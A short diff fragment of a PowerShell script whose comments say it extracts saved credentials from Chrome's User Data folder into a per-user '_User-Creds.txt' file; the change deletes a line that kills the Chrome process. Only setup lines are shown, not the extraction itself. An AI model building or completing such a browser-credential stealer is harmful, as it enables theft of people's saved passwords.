@@ -17,7 +17,7 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 #Stage 1 Obtain the credentials from the Chrome browsers User Data folder
 
 #First we Kill Chrome just to be safe
-Stop-Process -Name Chrome
+
 
 $d=Add-Type -A System.Security
 $p='public static'
